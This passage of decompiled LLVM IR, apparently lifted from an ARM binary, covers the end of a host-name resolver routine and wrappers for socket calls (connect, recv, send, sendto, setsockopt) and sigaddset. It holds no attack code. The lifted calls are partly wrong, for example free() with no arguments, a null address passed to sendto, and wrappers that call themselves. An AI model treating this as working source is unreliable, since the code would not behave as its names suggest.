  %v2_12074 = load i32, i32* %v1_12074, align 4
  store i32 %v2_12074, i32* %r3.global-to-local, align 4
  %v7_12078 = icmp eq i32 %v2_12074, 1
  br i1 %v7_12078, label %dec_label_pc_1209c, label %dec_label_pc_12080

dec_label_pc_12080:                               ; preds = %dec_label_pc_12070
  %v7_12080 = icmp eq i32 %v2_12074, 4
  br i1 %v7_12080, label %dec_label_pc_1209c, label %dec_label_pc_12088

dec_label_pc_12088:                               ; preds = %dec_label_pc_12080
  %v3_12088 = icmp eq i32 %v2_12074, -1
  br i1 %v3_12088, label %dec_label_pc_12090, label %dec_label_pc_12354

dec_label_pc_12090:                               ; preds = %dec_label_pc_12088
  %v0_12090 = load i32, i32* @r5, align 4
  %v1_12090 = inttoptr i32 %v0_12090 to i32*
  %v2_12090 = load i32, i32* %v1_12090, align 4
  store i32 %v2_12090, i32* %r3.global-to-local, align 4
  %v7_12094 = icmp eq i32 %v2_12090, 2
  br i1 %v7_12094, label %dec_label_pc_1209c, label %dec_label_pc_12354

dec_label_pc_1209c:                               ; preds = %dec_label_pc_12090, %dec_label_pc_12080, %dec_label_pc_12070
  %v0_1209c = load i32, i32* @r7, align 4
  %v1_1209c = sub i32 0, %v0_1209c
  %v1_120a0 = urem i32 %v1_1209c, 4
  store i32 %v1_120a0, i32* %r3.global-to-local, align 4
  %v2_120a0 = icmp eq i32 %v1_120a0, 0
  %v0_120a4 = load i32, i32* @r8, align 4
  %v1_120a4 = load i32, i32* @r5, align 4
  %v2_120a4 = inttoptr i32 %v1_120a4 to i32*
  store i32 %v0_120a4, i32* %v2_120a4, align 4
  %v0_120c4.pre = load i32, i32* @r4, align 4
  br i1 %v2_120a0, label %dec_label_pc_120bc, label %dec_label_pc_120ac

dec_label_pc_120ac:                               ; preds = %dec_label_pc_1209c
  %v1_120ac = load i32, i32* %r3.global-to-local, align 4
  %v2_120ac = sub i32 %v0_120c4.pre, %v1_120ac
  %v3_120ac = icmp ult i32 %v0_120c4.pre, %v1_120ac
  br i1 %v3_120ac, label %dec_label_pc_12350, label %dec_label_pc_120b4

dec_label_pc_120b4:                               ; preds = %dec_label_pc_120ac
  store i32 %v2_120ac, i32* @r4, align 4
  %v0_120b8 = load i32, i32* @r7, align 4
  %v2_120b8 = add i32 %v0_120b8, %v1_120ac
  store i32 %v2_120b8, i32* @r7, align 4
  br label %dec_label_pc_120bc

dec_label_pc_120bc:                               ; preds = %dec_label_pc_1209c, %dec_label_pc_120b4
  %v0_120c4 = phi i32 [ %v2_120ac, %dec_label_pc_120b4 ], [ %v0_120c4.pre, %dec_label_pc_1209c ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  store i32 -1, i32* %v1_12074, align 4
  %tmp31 = icmp ult i32 %v0_120c4, 4
  br i1 %tmp31, label %dec_label_pc_12350, label %dec_label_pc_120d0

dec_label_pc_120d0:                               ; preds = %dec_label_pc_120bc
  %v0_120d0 = load i32, i32* @r4, align 4
  %v1_120d0 = add i32 %v0_120d0, -4
  store i32 %v1_120d0, i32* %r3.global-to-local, align 4
  %tmp32 = icmp ult i32 %v1_120d0, 8
  br i1 %tmp32, label %dec_label_pc_12350, label %dec_label_pc_120dc

dec_label_pc_120dc:                               ; preds = %dec_label_pc_120d0
  %v1_120dc = add i32 %v0_120d0, -12
  store i32 %v1_120dc, i32* %r3.global-to-local, align 4
  %v0_120e0 = load i32, i32* @r7, align 4
  %v1_120e0 = add i32 %v0_120e0, 4
  store i32 %v1_120e0, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v3_120ec = inttoptr i32 %v1_120e0 to i32*
  store i32 %v0_120e0, i32* %v3_120ec, align 4
  %v0_120f0 = load i32, i32* @r5, align 4
  %v1_120f0 = load i32, i32* @sb, align 4
  %v2_120f0 = add i32 %v1_120f0, 4
  %v3_120f0 = inttoptr i32 %v2_120f0 to i32*
  store i32 %v0_120f0, i32* %v3_120f0, align 4
  %tmp33 = icmp ult i32 %v1_120dc, 32
  br i1 %tmp33, label %dec_label_pc_12350, label %dec_label_pc_120f8

dec_label_pc_120f8:                               ; preds = %dec_label_pc_120dc
  %v0_120f8 = load i32, i32* @r4, align 4
  %v1_120f8 = add i32 %v0_120f8, -44
  store i32 %v1_120f8, i32* @r8, align 4
  %tmp34 = icmp ult i32 %v1_120f8, 256
  br i1 %tmp34, label %dec_label_pc_12350, label %dec_label_pc_12104

dec_label_pc_12104:                               ; preds = %dec_label_pc_120f8
  %v0_12104 = load i32, i32* @r7, align 4
  %v1_12104 = add i32 %v0_12104, 44
  store i32 %v1_12104, i32* @r6, align 4
  %v1_12108 = add i32 %v0_12104, 12
  store i32 %v1_12108, i32* %r3.global-to-local, align 4
  %v0_1210c = load i32, i32* @fp, align 4
  store i32 %v0_1210c, i32* @r1, align 4
  store i32 %v1_120f8, i32* %r2.global-to-local, align 4
  store i32 %v1_12104, i32* %r0.global-to-local, align 4
  %v3_1211c = call i32 @strncpy(i32 %v1_12104, i32 %v0_1210c, i32 %v1_120f8)
  store i32 %v1_12108, i32* %ip.global-to-local, align 4
  %v0_12124 = load i32, i32* @r6, align 4
  %v1_12124 = load i32, i32* @r7, align 4
  %v2_12124 = add i32 %v1_12124, 12
  %v3_12124 = inttoptr i32 %v2_12124 to i32*
  store i32 %v0_12124, i32* %v3_12124, align 4
  %v0_12128 = load i32, i32* @fp, align 4
  store i32 %v0_12128, i32* %r0.global-to-local, align 4
  %v0_1212c = load i32, i32* @r5, align 4
  %v1_1212c = load i32, i32* %ip.global-to-local, align 4
  %v2_1212c = add i32 %v1_1212c, 4
  %v3_1212c = inttoptr i32 %v2_1212c to i32*
  store i32 %v0_1212c, i32* %v3_1212c, align 4
  %v0_12130 = load i32, i32* @r7, align 4
  %v2_12134 = inttoptr i32 %v0_12128 to i8*
  %v3_12134 = call i32 @inet_aton(i8* %v2_12134, i32 %v0_12130)
  store i32 %v3_12134, i32* %r0.global-to-local, align 4
  %v2_12138 = icmp eq i32 %v3_12134, 0
  br i1 %v2_12138, label %dec_label_pc_1217c, label %dec_label_pc_12144

dec_label_pc_12144:                               ; preds = %dec_label_pc_12104
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_12148 = load i32, i32* @sl, align 4
  %v2_12148 = add i32 %v1_12148, 8
  %v3_12148 = inttoptr i32 %v2_12148 to i32*
  store i32 2, i32* %v3_12148, align 4
  %v0_1214c = load i32, i32* %r3.global-to-local, align 4
  %v2_1214c = mul i32 %v0_1214c, 2
  %v1_12150 = load i32, i32* @sl, align 4
  %v2_12150 = add i32 %v1_12150, 12
  %v3_12150 = inttoptr i32 %v2_12150 to i32*
  store i32 %v2_1214c, i32* %v3_12150, align 4
  %v3_12154 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_12154, i32* %r2.global-to-local, align 4
  store i32 %v1_12108, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* @ip, align 4
  %v0_12160 = load i32, i32* @r5, align 4
  store i32 %v0_12160, i32* %r0.global-to-local, align 4
  %v0_12164 = load i32, i32* @sl, align 4
  %v2_12164 = inttoptr i32 %v3_12154 to i32*
  store i32 %v0_12164, i32* %v2_12164, align 4
  %v0_12168 = load i32, i32* @r6, align 4
  %v1_12168 = load i32, i32* @sl, align 4
  %v2_12168 = inttoptr i32 %v1_12168 to i32*
  store i32 %v0_12168, i32* %v2_12168, align 4
  %v0_1216c = load i32, i32* @sb, align 4
  %v1_1216c = load i32, i32* @sl, align 4
  %v2_1216c = add i32 %v1_1216c, 16
  %v3_1216c = inttoptr i32 %v2_1216c to i32*
  store i32 %v0_1216c, i32* %v3_1216c, align 4
  %v0_12170 = load i32, i32* %r3.global-to-local, align 4
  %v1_12170 = load i32, i32* @sl, align 4
  %v2_12170 = add i32 %v1_12170, 4
  %v3_12170 = inttoptr i32 %v2_12170 to i32*
  store i32 %v0_12170, i32* %v3_12170, align 4
  %v0_12174 = load i32, i32* @r5, align 4
  %v1_12174 = load i32, i32* @ip, align 4
  %v2_12174 = inttoptr i32 %v1_12174 to i32*
  store i32 %v0_12174, i32* %v2_12174, align 4
  br label %dec_label_pc_12354

dec_label_pc_1217c:                               ; preds = %dec_label_pc_12104
  %v2_1217c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1217c, i32* @r5, align 4
  %v1_12180 = call i32 @__open_nameservers(i32 0)
  store i32 ptrtoint (i32* @global_var_24138.715 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_1217c, i32* @r0, align 4
  store i32 79740, i32* %r3.global-to-local, align 4
  %v1_12198 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_13774.590 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24138.715 to i32), i32* %r0.global-to-local, align 4
  %v1_121a8 = call i32 @__pthread_return_0()
  store i32 %v2_1217c, i32* @r0, align 4
  %v2_121b4 = load i32, i32* @global_var_2a4b4.720, align 4
  store i32 %v2_121b4, i32* @r4, align 4
  store i32 79740, i32* %r3.global-to-local, align 4
  %v1_121c4 = call i32 @__pthread_return_void()
  %v2_121d0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_2a4a8.723 to i32), i32* %r3.global-to-local, align 4
  %v0_121dc = load i32, i32* @fp, align 4
  store i32 %v0_121dc, i32* %r0.global-to-local, align 4
  %v2_121e0 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_121e0, i32* @ip, align 4
  %v0_121e4 = load i32, i32* @r4, align 4
  store i32 %v0_121e4, i32* %r2.global-to-local, align 4
  %v6_121f8 = inttoptr i32 %v0_121dc to i8*
  %v7_121f8 = call i32 @__dns_lookup(i8* %v6_121f8, i32 1, i32 %v0_121e4, i32 ptrtoint (i32* @global_var_2a4a8.723 to i32), i32 %v2_121d0, i32 %v2_121e0)
  store i32 %v7_121f8, i32* %r0.global-to-local, align 4
  %v1_121fc = icmp slt i32 %v7_121f8, 0
  br i1 %v1_121fc, label %.dec_label_pc_12328_crit_edge, label %dec_label_pc_1220c

.dec_label_pc_12328_crit_edge:                    ; preds = %dec_label_pc_1217c
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12328

dec_label_pc_1220c:                               ; preds = %dec_label_pc_1217c
  store i32 256, i32* %r3.global-to-local, align 4
  %v1_12220 = load i32, i32* @r8, align 4
  %tmp35 = icmp ugt i32 %v1_12220, 255
  br i1 %tmp35, label %dec_label_pc_122bc, label %dec_label_pc_12228

dec_label_pc_12228:                               ; preds = %dec_label_pc_1220c
  %v3_12228 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_12228, i32* @r0, align 4
  %v0_1222c = call i32 @free()
  %v3_12230 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_12230, i32* @r0, align 4
  %v0_12234 = call i32 @free()
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %v1_12074, align 4
  br label %dec_label_pc_12354

dec_label_pc_122bc:                               ; preds = %dec_label_pc_1220c
  %v3_122c0.pre = load i32, i32* %stack_var_-96, align 4
  %v0_122c4.pre = load i32, i32* @r6, align 4
  store i32 %v1_12220, i32* %r2.global-to-local, align 4
  store i32 %v3_122c0.pre, i32* @r1, align 4
  store i32 %v0_122c4.pre, i32* %r0.global-to-local, align 4
  %v3_122c8 = call i32 @strncpy(i32 %v0_122c4.pre, i32 %v3_122c0.pre, i32 %v1_12220)
  %v3_122cc = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_122cc, i32* @r0, align 4
  %v0_122d0 = call i32 @free()
  store i32 %v0_122d0, i32* %r0.global-to-local, align 4
  store i32 %tmp7, i32* %r3.global-to-local, align 4
  %v7_122d8 = icmp eq i32 %tmp7, 1
  br i1 %v7_122d8, label %dec_label_pc_122e0, label %dec_label_pc_12334

dec_label_pc_122e0:                               ; preds = %dec_label_pc_122bc
  store i32 4, i32* @r2, align 4
  %v0_122e8 = load i32, i32* @r7, align 4
  store i32 %v0_122e8, i32* @r0, align 4
  %v0_122ec = call i32 @memcpy()
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v1_12108, i32* %r2.global-to-local, align 4
  %v1_122f8 = load i32, i32* @sl, align 4
  %v2_122f8 = add i32 %v1_122f8, 8
  %v3_122f8 = inttoptr i32 %v2_122f8 to i32*
  store i32 2, i32* %v3_122f8, align 4
  %v0_122fc = load i32, i32* %r3.global-to-local, align 4
  %v2_122fc = mul i32 %v0_122fc, 2
  store i32 %v2_122fc, i32* %r3.global-to-local, align 4
  %v1_12300 = load i32, i32* @sl, align 4
  %v2_12300 = add i32 %v1_12300, 12
  %v3_12300 = inttoptr i32 %v2_12300 to i32*
  store i32 %v2_122fc, i32* %v3_12300, align 4
  %v3_12304 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_12304, i32* @r0, align 4
  %v0_12308 = load i32, i32* @r6, align 4
  %v1_12308 = load i32, i32* @sl, align 4
  %v2_12308 = inttoptr i32 %v1_12308 to i32*
  store i32 %v0_12308, i32* %v2_12308, align 4
  %v0_1230c = load i32, i32* @sb, align 4
  %v1_1230c = load i32, i32* @sl, align 4
  %v2_1230c = add i32 %v1_1230c, 16
  %v3_1230c = inttoptr i32 %v2_1230c to i32*
  store i32 %v0_1230c, i32* %v3_1230c, align 4
  %v0_12310 = load i32, i32* %r2.global-to-local, align 4
  %v1_12310 = load i32, i32* @sl, align 4
  %v2_12310 = add i32 %v1_12310, 4
  %v3_12310 = inttoptr i32 %v2_12310 to i32*
  store i32 %v0_12310, i32* %v3_12310, align 4
  %v0_12314 = call i32 @free()
  %v3_12318 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_12318, i32* @ip, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_12320 = load i32, i32* @sl, align 4
  %v2_12320 = inttoptr i32 %v3_12318 to i32*
  store i32 %v0_12320, i32* %v2_12320, align 4
  %v0_12324 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_12324, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12328

dec_label_pc_12328:                               ; preds = %.dec_label_pc_12328_crit_edge, %dec_label_pc_122e0
  %v0_1232c = phi i32 [ 1, %.dec_label_pc_12328_crit_edge ], [ %v0_12324, %dec_label_pc_122e0 ]
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 %v0_1232c, i32* %v1_12074, align 4
  br label %dec_label_pc_12354

dec_label_pc_12334:                               ; preds = %dec_label_pc_122bc
  %v3_12334 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_12334, i32* @r0, align 4
  %v0_12338 = call i32 @free()
  store i32 %arg6, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %v1_12074, align 4
  br label %dec_label_pc_12354

dec_label_pc_12350:                               ; preds = %dec_label_pc_120ac, %dec_label_pc_120f8, %dec_label_pc_120dc, %dec_label_pc_120d0, %dec_label_pc_120bc
  store i32 34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12354

dec_label_pc_12354:                               ; preds = %bb, %dec_label_pc_12090, %dec_label_pc_12088, %dec_label_pc_12030, %dec_label_pc_12334, %dec_label_pc_12328, %dec_label_pc_12228, %dec_label_pc_12144, %dec_label_pc_12350
  store i32 %v6_12004, i32* @r5, align 4
  store i32 %v9_12004, i32* @r6, align 4
  store i32 %v12_12004, i32* @r7, align 4
  store i32 %v15_12004, i32* @r8, align 4
  store i32 %v18_12004, i32* @sb, align 4
  store i32 %v21_12004, i32* @sl, align 4
  store i32 %v24_12004, i32* @fp, align 4
  %v29_12358 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v29_12358

; uselistorder directives
  uselistorder i32 %v2_122fc, { 1, 0 }
  uselistorder i32 %v1_12220, { 1, 2, 0 }
  uselistorder i32 %v1_12108, { 1, 2, 0, 3 }
  uselistorder i32 %v1_12104, { 1, 0, 2 }
  uselistorder i32 %v1_120f8, { 2, 1, 0, 3 }
  uselistorder i32 %v0_120c4.pre, { 0, 2, 1 }
  uselistorder i32 %v1_120a0, { 1, 0 }
  uselistorder i32* %v1_12074, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_12014, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 19, 3, 4, 5, 6, 7, 8, 9, 12, 10, 11, 13, 15, 14, 16, 18, 17, 21, 20, 0, 1, 2 }
  uselistorder i32 %arg6, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_12354, { 8, 4, 5, 6, 7, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_12350, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_12328, { 1, 0 }
  uselistorder label %dec_label_pc_120bc, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12378 = load i32, i32* @r4, align 4
  store i32 %v3_12378, i32* %stack_var_-8, align 4
  %v5_1237c = call i32 @connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_1237c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_1237c, -4095
  br i1 %tmp, label %dec_label_pc_1239c, label %dec_label_pc_1238c

dec_label_pc_1238c:                               ; preds = %entry
  %v0_1238c = call i32 @__errno_location()
  %v0_12390 = load i32, i32* %r4.global-to-local, align 4
  %v1_12390 = sub i32 0, %v0_12390
  %v2_12394 = inttoptr i32 %v0_1238c to i32*
  store i32 %v1_12390, i32* %v2_12394, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1239c

dec_label_pc_1239c:                               ; preds = %entry, %dec_label_pc_1238c
  %v0_1239c = phi i32 [ %v5_1237c, %entry ], [ -1, %dec_label_pc_1238c ]
  %v2_123a0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_123a0, i32* @r4, align 4
  ret i32 %v0_1239c

; uselistorder directives
  uselistorder i32 %v5_1237c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1239c, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_123a4 = load i32, i32* @r4, align 4
  store i32 %v3_123a4, i32* %stack_var_-8, align 4
  %v5_123a8 = inttoptr i32 %arg3 to i32*
  %v6_123a8 = call i32 @getsockname(i32 %arg1, %sockaddr* %arg2, i32* %v5_123a8)
  store i32 %v6_123a8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v6_123a8, -4095
  br i1 %tmp, label %dec_label_pc_123c8, label %dec_label_pc_123b8

dec_label_pc_123b8:                               ; preds = %entry
  %v0_123b8 = call i32 @__errno_location()
  %v0_123bc = load i32, i32* %r4.global-to-local, align 4
  %v1_123bc = sub i32 0, %v0_123bc
  %v2_123c0 = inttoptr i32 %v0_123b8 to i32*
  store i32 %v1_123bc, i32* %v2_123c0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_123c8

dec_label_pc_123c8:                               ; preds = %entry, %dec_label_pc_123b8
  %v0_123c8 = phi i32 [ %v6_123a8, %entry ], [ -1, %dec_label_pc_123b8 ]
  %v2_123cc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_123cc, i32* @r4, align 4
  ret i32 %v0_123c8

; uselistorder directives
  uselistorder i32 %v6_123a8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_123c8, { 1, 0 }
}

define i32 @getsockopt() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_123d0 = load i32, i32* @r4, align 4
  store i32 %v3_123d0, i32* %stack_var_-8, align 4
  %v0_123d8 = call i32 @getsockopt()
  store i32 %v0_123d8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_123d8, -4095
  br i1 %tmp, label %dec_label_pc_123f8, label %dec_label_pc_123e8

dec_label_pc_123e8:                               ; preds = %entry
  %v0_123e8 = call i32 @__errno_location()
  %v0_123ec = load i32, i32* %r4.global-to-local, align 4
  %v1_123ec = sub i32 0, %v0_123ec
  %v2_123f0 = inttoptr i32 %v0_123e8 to i32*
  store i32 %v1_123ec, i32* %v2_123f0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_123f8

dec_label_pc_123f8:                               ; preds = %entry, %dec_label_pc_123e8
  %v0_123f8 = phi i32 [ %v0_123d8, %entry ], [ -1, %dec_label_pc_123e8 ]
  %v2_123fc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_123fc, i32* @r4, align 4
  ret i32 %v0_123f8

; uselistorder directives
  uselistorder i32 %v0_123d8, { 1, 0, 2 }
  uselistorder i32 ()* @getsockopt, { 2, 1, 0 }
  uselistorder label %dec_label_pc_123f8, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12400 = load i32, i32* @r4, align 4
  store i32 %v3_12400, i32* %stack_var_-8, align 4
  %v5_12404 = call i32 @recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_12404, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_12404, -4095
  br i1 %tmp, label %dec_label_pc_12424, label %dec_label_pc_12414

dec_label_pc_12414:                               ; preds = %entry
  %v0_12414 = call i32 @__errno_location()
  %v0_12418 = load i32, i32* %r4.global-to-local, align 4
  %v1_12418 = sub i32 0, %v0_12418
  %v2_1241c = inttoptr i32 %v0_12414 to i32*
  store i32 %v1_12418, i32* %v2_1241c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12424

dec_label_pc_12424:                               ; preds = %entry, %dec_label_pc_12414
  %v0_12424 = phi i32 [ %v5_12404, %entry ], [ -1, %dec_label_pc_12414 ]
  %v2_12428 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12428, i32* @r4, align 4
  ret i32 %v0_12424

; uselistorder directives
  uselistorder i32 %v5_12404, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12424, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1242c = load i32, i32* @r4, align 4
  store i32 %v3_1242c, i32* %stack_var_-8, align 4
  %v5_12430 = call i32 @send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_12430, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_12430, -4095
  br i1 %tmp, label %dec_label_pc_12450, label %dec_label_pc_12440

dec_label_pc_12440:                               ; preds = %entry
  %v0_12440 = call i32 @__errno_location()
  %v0_12444 = load i32, i32* %r4.global-to-local, align 4
  %v1_12444 = sub i32 0, %v0_12444
  %v2_12448 = inttoptr i32 %v0_12440 to i32*
  store i32 %v1_12444, i32* %v2_12448, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12450

dec_label_pc_12450:                               ; preds = %entry, %dec_label_pc_12440
  %v0_12450 = phi i32 [ %v5_12430, %entry ], [ -1, %dec_label_pc_12440 ]
  %v2_12454 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12454, i32* @r4, align 4
  ret i32 %v0_12450

; uselistorder directives
  uselistorder i32 %v5_12430, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12450, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_12458 = load i32, i32* @r4, align 4
  store i32 %v3_12458, i32* %stack_var_-12, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_12464 = call i32 @sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32 0)
  store i32 %v5_12464, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_12464, -4095
  br i1 %tmp, label %dec_label_pc_12484, label %dec_label_pc_12474

dec_label_pc_12474:                               ; preds = %entry
  %v0_12474 = call i32 @__errno_location()
  %v0_12478 = load i32, i32* %r4.global-to-local, align 4
  %v1_12478 = sub i32 0, %v0_12478
  %v2_1247c = inttoptr i32 %v0_12474 to i32*
  store i32 %v1_12478, i32* %v2_1247c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12484

dec_label_pc_12484:                               ; preds = %entry, %dec_label_pc_12474
  %v0_12484 = phi i32 [ %v5_12464, %entry ], [ -1, %dec_label_pc_12474 ]
  %v2_12488 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12488, i32* @r4, align 4
  ret i32 %v0_12484

; uselistorder directives
  uselistorder i32 %v5_12464, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12484, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1248c = load i32, i32* @r4, align 4
  store i32 %v3_1248c, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_12494 = call i32 @setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 0)
  store i32 %v5_12494, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_12494, -4095
  br i1 %tmp, label %dec_label_pc_124b4, label %dec_label_pc_124a4

dec_label_pc_124a4:                               ; preds = %entry
  %v0_124a4 = call i32 @__errno_location()
  %v0_124a8 = load i32, i32* %r4.global-to-local, align 4
  %v1_124a8 = sub i32 0, %v0_124a8
  %v2_124ac = inttoptr i32 %v0_124a4 to i32*
  store i32 %v1_124a8, i32* %v2_124ac, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_124b4

dec_label_pc_124b4:                               ; preds = %entry, %dec_label_pc_124a4
  %v0_124b4 = phi i32 [ %v5_12494, %entry ], [ -1, %dec_label_pc_124a4 ]
  %v2_124b8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_124b8, i32* @r4, align 4
  ret i32 %v0_124b4

; uselistorder directives
  uselistorder i32 %v5_12494, { 1, 0, 2 }
  uselistorder label %dec_label_pc_124b4, { 1, 0 }
}

define i32 @socket() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_124bc = load i32, i32* @r4, align 4
  store i32 %v3_124bc, i32* %stack_var_-8, align 4
  %v0_124c0 = call i32 @socket()
  store i32 %v0_124c0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_124c0, -4095
  br i1 %tmp, label %dec_label_pc_124e0, label %dec_label_pc_124d0

dec_label_pc_124d0:                               ; preds = %entry
  %v0_124d0 = call i32 @__errno_location()
  %v0_124d4 = load i32, i32* %r4.global-to-local, align 4
  %v1_124d4 = sub i32 0, %v0_124d4
  %v2_124d8 = inttoptr i32 %v0_124d0 to i32*
  store i32 %v1_124d4, i32* %v2_124d8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_124e0

dec_label_pc_124e0:                               ; preds = %entry, %dec_label_pc_124d0
  %v0_124e0 = phi i32 [ %v0_124c0, %entry ], [ -1, %dec_label_pc_124d0 ]
  %v2_124e4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_124e4, i32* @r4, align 4
  ret i32 %v0_124e0

; uselistorder directives
  uselistorder i32 %v0_124c0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_124e0, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %tmp2 = icmp slt i32 %arg1, 1
  br i1 %tmp2, label %dec_label_pc_12504, label %dec_label_pc_124f4

dec_label_pc_124f4:                               ; preds = %entry
  %v8_124f8 = icmp sgt i32 %arg1, 64
  br i1 %v8_124f8, label %dec_label_pc_12504, label %dec_label_pc_124fc

dec_label_pc_124fc:                               ; preds = %dec_label_pc_124f4
  %v0_12500 = call i32 @__sigaddset()
  br label %dec_label_pc_12504

dec_label_pc_12504:                               ; preds = %dec_label_pc_124f4, %entry, %dec_label_pc_124fc
  %v0_12504 = call i32 @__errno_location()
  %v2_1250c = inttoptr i32 %v0_12504 to i32*
  store i32 22, i32* %v2_1250c, align 4
  ret i32 -1

; uselistorder directives
